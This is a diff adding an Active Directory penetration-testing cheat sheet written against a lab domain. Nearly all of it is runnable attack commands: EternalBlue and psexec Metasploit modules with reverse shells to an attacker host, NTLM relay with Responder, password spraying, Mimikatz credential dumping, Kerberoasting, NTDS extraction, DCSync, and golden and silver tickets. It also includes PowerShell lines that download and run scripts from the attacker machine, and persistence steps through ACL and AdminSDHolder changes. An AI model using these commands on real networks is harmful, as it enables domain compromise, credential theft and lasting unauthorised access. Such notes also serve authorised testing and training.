@@ -1,0 +1,508 @@
+		
+		 Active Directory Penetration Testing by Zahid Arafat Khan ||	Email:zahid@byte-intel.com 
+		 =========================================================================================
+
+		Root Domain = HackLab.local
+			DC FQDN = srv12.HackLab.local
+			DC IPAddr = 192.168.50.50
+		Child Domain = CDC.HackLab.local
+			DC FQDN = srv08.CDC.HackLab.local
+			DC IPAddr = 192.168.50.60
+
+			
+	Network Mapping
+	---------------
+
+		nmap -n -v 192.168.50.50-60 -p 389 --open
+			
+		nmap -n -v 192.168.50.50-60 -p 88 --open
+		
+		nmap -n -v 192.168.50.50-60 -p 53 --open
+		
+		nmap -n -v -p445 --script=smb-os-discovery 192.168.50.50-60
+		
+		nmap -n -v -p445 --script=smb-enum-shares 192.168.50.50-60
+		
+
+	ms17-010 - EternalBlue
+	----------------------
+
+		use auxiliary/scanner/smb/smb_ms17_010
+		set RHOSTS 192.168.50.60
+		run
+	
+		Exploit - 1
+		-----------
+	 	
+		use exploit/windows/smb/ms17_010_eternalblue 
+		set PAYLOAD windows/x64/meterpreter/reverse_tcp
+		set RHOST 192.168.50.60
+		set LHOST 192.168.50.71
+		exploit
+	
+		Exploit - 2
+		-----------
+	
+		use exploit/windows/smb/ms17_010_psexec
+		set PAYLOAD windows/x64/meterpreter/reverse_tcp
+		set RHOST 192.168.50.60
+		set LHOST 192.168.50.71
+		exploit
+	
+	
+	SMB/NTLM Relay
+	----------
+		
+		cme smb 192.168.50.50-60 --gen-relay-list /root/AD-Pentest/targets.txt		
+		
+		vim /etc/responder/Responder.conf 
+		
+				SMB = Off     
+				HTTP = Off    		<-- Both of these services should be turned off
+		
+		responder -I eth0 -rwd
+	
+		msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.50.71 LPORT=4455 -f exe -o /root/AD-Pentest/rev-shell.exe
+	
+		ntlmrelayx.py -tf /root/AD-Pentest/targets.txt		# By default, ntlmrelayx.py upon a successful relay will dump the SAM database of the target.
+
+		ntlmrelayx.py -t <IP Address>
+		
+		ntlmrelayx.py -tf /root/AD-Pentest/targets.txt	 -c <insert your Empire/Metasploit Powershell launcher here>
+
+		ntlmrelayx.py -tf targets.txt -e /root/AD-Pentest/rev-shell.exe
+		
+		Setup Metasploit
+		----------------		
+			use exploit/multi/handler 
+			set PAYLOAD windows/x64/meterpreter/reverse_tcp
+			set LHOST 192.168.50.71
+			set LPORT 4455
+			set ExitOnSession false
+			set AutoRunScript post/windows/manage/migrate		
+			exploit -j -z
+
+		
+		Setup Empire
+		------------
+			cd /opt/Empire
+			
+			./empire
+
+			listeners
+			uselistener http
+			info
+			set Host http://192.168.50.71:8080
+			set Port 8080
+			execute
+
+			launcher powershell 			<--
+
+			agents
+
+		
+	Collecting Domain Users
+	----------------------
+		From Domain Machine
+		
+			net user /domain
+			
+			wmic USERACCOUNT where "Domain='CDC'" Get Name
+			
+			net group "Domain Admins" /domain
+			
+			net accounts /domain
+
+		Rid Relaying
+		------------
+			
+			cme smb 192.168.50.50-60 --gen-relay-list relayHosts.txt
+	
+			vim /etc/responder/Responder.conf			<-- set SMB "Off"
+			
+			responder -I eth0	
+			
+			python /opt/ridrelay/ridrelay.py -t 192.168.50.51		
+		
+	Gathering Passwords
+	-------------------
+					
+		Password Spray
+		--------------
+			
+			vim /root/AD-Pentest/UserList.txt		<-- Domain Users
+			vim /root/AD-Pentest/PassList.txt		<-- Potentail Passwords
+			
+			
+			cd /opt/Spray/
+			
+			./spray.sh -smb 192.168.50.60 /root/AD-Pentest/UserList.txt /root/AD-Pentest/PassList.txt 4 35 cdc.HackLab.local
+				
+			cat /opt/Spray/logs/spray-logs.txt 
+				
+			cat /opt/Spray/logs/credentials.txt 					
+		
+		Collecting NTLMv2 Hashes
+		------------------------------------
+		
+			vim /etc/responder/Responder.conf			<-- set SMB & HTTP value "On"
+
+			responder -I eth0
+			
+			ls /usr/share/responder/logs/
+			
+			hashcat -m 5600 hashes /usr/share/responder/logs/SMB-NTLMv2-SSP-<IP Address>.txt -o output.pot
+			john --wordlist=/usr/share/wordlists/rockyou.txt /usr/share/responder/logs/SMB-NTLMv2-SSP-<IP Address>.txt 
+			
+		Social Engineerig - Collecting NTLMv2 Hashes	
+		--------------------------------------------
+			
+			smbserver.py Salary /root/Salary/ -smb2support
+			
+		Cracking NTLMv2 Hashes
+		----------------------
+			
+			hashcat -m 5600 hashes /usr/share/responder/logs/SMB-NTLMv2-SSP-<IP Address>.txt -o output.pot
+			
+			john --wordlist=/usr/share/wordlists/rockyou.txt /usr/share/responder/logs/SMB-NTLMv2-SSP-<IP Address>.txt 			
+			
+		Collecting clear text Credentails (WPAD)
+		---------------------------------------
+		
+			responder -I eth0 -bwF				# Set HTTP "On"
+	
+			http://google
+		
+	
+	MS14-068 Exploitation
+	---------------------
+
+	Method - 1
+		
+		goldenPac.py cdc.HackLab.local/cuser1:P@ssw0rd@srv08.cdc.HackLab.local
+
+
+	Method - 2	
+	
+		cd /root/AD-Pentest
+		
+		rpcclient -W cdc.HackLab -U CUser1 192.168.50.60
+
+		rpcclient $> lookupnames CUser1
+		
+		python /opt/windows-kernel-exploits/MS14-068/pykek/ms14-068.py -u CUser1@cdc.HackLab.local -p P@ssw0rd -s S-1-5-21-2077148471-2311897568-3335151138-1118 -d srv08.cdc.HackLab.local
+
+		export "KRB5CCNAME=/root/AD-Pentest/TGT_CUser1@cdc.HackLab.local.ccache"
+
+		psexec.py -k -no-pass -debug srv08.cdc.HackLab.local
+
+		wmiexec.py -k -no-pass -debug srv08.cdc.HackLab.local
+		
+		smbclient -W cdc.HackLab.local -k //Srv08/c$		
+		
+		
+	Privilege Escalation (MS14-025)
+	-------------------------------
+		runas /netonly /user:cdc.HackLab.local\CUser1 cmd
+
+		findstr /snip /c:"cpassword" \\192.168.50.60\sysvol\*.xml
+		
+		Manual Decryption
+		-----------------
+		gpp-decrypt T7buX2g4k4hkVLB87PEmzrw05yA0fg2Rl1WKET2HPSW5XxQ/8VMkeFvOKs9R45IE	
+	
+		Using CrackMapExec
+		------------------
+		cme smb 192.168.50.60 -u cuser1 -p P@ssw0rd -M gpp_password
+	
+	The Credential Theft Shuffle
+	----------------------------
+	
+		use exploit/windows/smb/psexec
+		set PAYLOAD windows/x64/meterpreter/reverse_tcp
+		set SMBUSER CUser1
+		set SMBPASS P@ssw0rd
+		set SMBDomain cdc.HackLab.local
+		set RHOST 192.168.50.51
+		set LHOST 192.168.50.71
+		exploit
+	
+	meterpreter> hashdump
+	
+		Pass the Hash
+		-------------
+		
+			Find Vuln Machine
+			-----------------
+		
+			cme smb 192.168.50.51-55 -u admin -H aad3b435b51404eeaad3b435b51404ee:f006877ea6557c2210cef6f941ffafe7 --local-auth
+				
+			Passing the Hashing
+			-------------------
+			use exploit/windows/smb/psexec
+			set PAYLOAD windows/x64/meterpreter/reverse_tcp
+			set RHOST 192.168.50.52
+			set LHOST 192.168.50.71
+			set LPORT 4455
+			set SMBUSER admin
+			set SMBPASS aad3b435b51404eeaad3b435b51404ee:f006877ea6557c2210cef6f941ffafe7
+			exploit 
+			
+			meterpreter > load kiwi
+			meterpreter > creds_all
+
+		
+		Overpass the Hash AKA (Pass the Key)
+		------------------------------------
+
+			use exploit/windows/smb/psexec
+			set PAYLOAD windows/x64/meterpreter/reverse_tcp
+			set RHOST 192.168.50.53
+			set LHOST 192.168.50.71
+			set LPORT 4466
+			set SMBUSER CUser3
+			set SMBPASS aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b
+			set SMBDomain CDC.HackLab.local
+			exploit 
+			
+		
+		psexec.py cdc.HackLab.local/CUser3@192.168.50.53 -hashes aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b
+		
+		cme smb 192.168.50.60 -u CUser3 -H 64f12cddaa88057e06a81b54e73b949b -M Mimikatz
+		
+		Mimikatz Tricks
+		---------------
+		
+			Inject Hashes int lsass
+			-----------------------
+				privilege::debug
+				sekurlsa::ekeys
+				
+				privilege::debug
+				sekurlsa::pth /user:Administrator /domain:cdc.HackLab.local /rc4:58a478135a93ac3bf058a5ea0e8fdb71 
+				sekurlsa::pth /user:Administrator /domain:cdc.HackLab.local /aes128:20792d0be7b2abe3dab7ba04e7a49f8e
+				sekurlsa::pth /user:Administrator /domain:cdc.HackLab.local /aes256:5f27824fe443dbc1d35089747792c23b7a68f12fd946c629768258f46317bd17
+			
+			Using Tickets(TGS)
+			-----------------
+			
+				Steal "Domain Admins" tokens
+			
+				load powershell
+				
+				powershell_import /opt/PowerSploit/Exfiltration/Invoke-Mimikatz.ps1
+
+				powershell_shell
+
+				Invoke-Mimikatz -Command '"kerberos::list" exit'
+
+				Invoke-Mimikatz -Command 'standard::base64 "kerberos::list /export" exit'
+
+				
+		Pass the Ticket
+		---------------	
+		
+			Run cmd with cdc\administrator account browse admin share to receive TGS
+			dir \\srv08\admin$
+	
+			mimikatz
+			--------
+			
+			kerberos::list
+			kerberos::list /export				<-- Export tickets from victim machine
+			
+			Using Tickets on Windows 
+			------------------------
+
+			kerberos::ptt <TGS Ticket>			<-- Inject into attacker machine even work with Non Domain Joined machine
+			 
+			dir \\srv08\admin$			<-- Success
+			
+			psexec \\srv08 cmd			<-- Got shell
+			
+			Using Tickets on Linux
+			----------------------
+				
+			kekeo
+			-----
+			misc::convert ccache xxxxxxxxx.kirbi		<-- Convert kirbi to ccache format
+
+			
+			export KRB5CCNAME="xxxxxxxxx.ccache"
+			psexec.py -k -no-pass -debug srv08.cdc.HackLab.local
+			
+
+	Kerberoasting
+	-------------
+
+		cd /root/AD-Pentest
+
+		GetUserSPNs.py cdc.Hacklab.local/cuser1:P@ssw0rd			<-- Finds SPN with user account
+
+		GetUserSPNs.py -request cdc.Hacklab.local/cuser1:P@ssw0rd | tee	/root/AD-Pentest/Kerberoast.ticket			<-- Request Ticket
+
+		Cracking Ticket
+		---------------
+
+		rm /opt/JohnTheRipper/run/john.pot 
+		
+		/opt/JohnTheRipper/run/john /root/AD-Pentest/Kerberoast.ticket	 --wordlist=/usr/share/wordlists/rockyou.txt --format=krb5tgs
+
+		hashcat -m 13100 --force /root/AD-Pentest/Kerberoast.ticket	 /usr/share/wordlists/rockyou.txt
+		
+		
+	Extracting NTDS
+	---------------
+	
+		cme smb 192.168.50.60 -u administrator -p Password123 --ntds vss
+ 
+		secretsdump.py cdc.HackLab.local/administrator:Password123@srv08.cdc.HackLab.local | tee /root/AD-Pentest/ntdsSecrets.txt
+		
+		Using kerberos tickets
+		----------------------
+		secretsdump.py -k -no-pass srv08.cdc.HackLab.local | tee /root/AD-Pentest/ntdsSecrets.txt
+	
+	Cracking NTDS Hashes
+	--------------------
+		
+		cat /root/AD-Pentest/ntdsSecrets.txt | grep ":::" | grep -v '\$' | tee /root/AD-Pentest/ntdsGrep.txt	<-- extract only user accounts from exported credentials
+		
+		john ntdsGrep.txt --format=NT --wordlist=/usr/share/wordlists/rockyou.txt 
+	
+	
+	DCSync
+	------
+	
+		Mimikatz
+		--------
+	
+			kerberos::golden /domain:cdc.HackLab.local /sid:S-1-5-21-2077148471-2311897568-3335151138 /krbtgt:f585ba5aa29349dec6b102492687ee73 /admin:administrator /ptt
+			
+			lsadump::dcsync /domain:cdc.HackLab.local /user:cdc\krbtgt
+			
+			lsadump::dcsync /domain:cdc.HackLab.local /user:cdc\CUser6
+			
+			lsadump::dcsync /domain:cdc.HackLab.local /user:cdc\administrator
+
+	
+	Downgrading Encryption
+	----------------------
+					
+		runas /netonly /user:cdc.HackLab.local\administrator powershell
+		
+		IEX(New-Object Net.WebClient).DownloadString("http://192.168.50.71:8000/Recon/PowerView.ps1")
+
+		Invoke-DowngradeAccount -SamAccountName CUser6 
+
+		lsadump::dcsync /domain:cdc.HackLab.local /user:cdc\CUser6
+
+		Invoke-DowngradeAccount -SamAccountName CUser6 -Repair		
+
+		
+
+	Golden Ticket
+	-------------
+
+		Windows
+		-------
+	
+		kerberos::golden /domain:cdc.HackLab.local /sid:S-1-5-21-2077148471-2311897568-3335151138 /krbtgt:f585ba5aa29349dec6b102492687ee73 /user:fakeUser /ptt
+	
+		c:\psexec64 \\srv08.cdc.HackLab.local cmd
+		
+		Linux
+		-----
+	
+		cd /root/AD-Pentest
+		
+		ticketer.py -nthash f585ba5aa29349dec6b102492687ee73 -domain-sid S-1-5-21-2077148471-2311897568-3335151138 -domain cdc.HackLab.local faKeUser
+	
+		export KRB5CCNAME="/root/AD-Pentest/faKeUser.ccache"
+		
+		psexec.py -k -no-pass -debug srv08.cdc.HackLab.local
+		
+		psexec.py -k -no-pass -debug SQLSrv.cdc.HackLab.local
+		
+		
+	Silver Ticket (Computer Account)
+	--------------------------------
+	
+	Windows
+	-------
+		kerberos::golden /admin:fakeUser /domain:cdc.HackLab.local /sid:S-1-5-21-2077148471-2311897568-3335151138 /rc4:ea3ae607ceccb34303aa18b71546c08c /target:Srv08.cdc.HackLab.local /service:cifs /ptt
+		
+		c:\psexec64.exe \\srv08.cdc.HackLab.local cmd
+
+	Linux
+	-----	
+		cd /root/AD-Pentest/	
+		ticketer.py -nthash ea3ae607ceccb34303aa18b71546c08c -domain-sid S-1-5-21-2077148471-2311897568-3335151138 -domain cdc.HackLab.local -spn cifs/srv08.cdc.HackLab.local fakeUser
+		export KRB5CCNAME="/root/AD-Pentest/fakeUser.ccache"
+		psexec.py -no-pass -k Srv08.cdc.HackLab.local
+	
+	Everlasting Silver Ticket
+	-------------------------
+	
+		Set DisablePasswordChange to 1
+		HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Netlogon\Parameters\DisablePasswordChange = 1
+		
+		reg query HKLM\SYSTEM\CurrentControlSet\Services\Netlogon\Parameters
+		
+		reg add HKLM\SYSTEM\CurrentControlSet\Services\Netlogon\Parameters /v DisablePasswordChange /t REG_DWORD /d 1 /f
+
+	Silver Ticket (Service Account)
+	-------------------------------
+		
+	Windows
+	-------
+	
+		kerberos::golden /user:fakeSql /domain:cdc.HackLab.local /sid:S-1-5-21-2077148471-2311897568-3335151138 /rc4:64f12cddaa88057e06a81b54e73b949b /target:SQLSrv.cdc.HackLab.local:1433 /service:MSSQLSvc /ticket:SQL-SilverTicket.kirbi 
+		
+		sqlcmd -S tcp:192.168.50.55,1433
+				
+		SELECT SYSTEM_USER;
+		GO
+		
+	Linux
+	-----
+
+		ticketer.py -nthash 64f12cddaa88057e06a81b54e73b949b -domain-sid S-1-5-21-2077148471-2311897568-3335151138 -domain cdc.HackLab.local -spn MSSQLSvc/SQLSrv.cdc.HackLab.local SQLUser
+		export KRB5CCNAME="/root/AD-Pentest/SQLUser.ccache"
+		mssqlclient.py -no-pass -k sqlsrv.cdc.HackLab.local
+		
+		enable_xp_cmdshell
+		SQL> xp_cmdshell ipconfig
+		
+		SQL> xp_cmdshell <Empire Powershell>
+		
+
+	Active Directory ACLs
+	---------------------
+	
+		runas /netonly /user:cdc.HackLab.local\Administrator powershell
+		
+		IEX(New-Object Net.WebClient).DownloadString("http://192.168.50.71:8000/Recon/PowerView.ps1")
+		
+		Add-ObjectACL -TargetDistinguishedName "dc=cdc,dc=HackLab,dc=local" -PrincipalSamAccountName CUser1 -Rights DCSync
+
+		runas /netonly /user:cdc.HackLab.local\CUser1 cmd	
+			
+		c:\Mimikatz\mimikatz.exe	
+		
+		lsadump::dcsync /domain:cdc.HackLab.local /user:cdc\krbtgt
+		
+		
+	AdminSDHolder
+	-------------
+	
+		IEX(New-Object Net.WebClient).DownloadString("http://192.168.50.71:8000/Recon/PowerView.ps1")
+		Add-ObjectAcl -TargetADSprefix 'CN=AdminSDHolder,CN=System' -PrincipalSamAccountName CUser1 -Verbose -Rights AllSS	
+		
+	Attacking Domain Trusts
+	-----------------------
+
+		kerberos::golden /domain:cdc.HackLab.local /sid:S-1-5-21-2077148471-2311897568-3335151138 /user:administrator /krbtgt:f585ba5aa29349dec6b102492687ee73 /sids:S-1-5-21-2705184121-1863425131-3625686869-519 /ptt
+		
+		misc::cmd
+		
+		psexec64 \\srv12.HackLab.local cmd
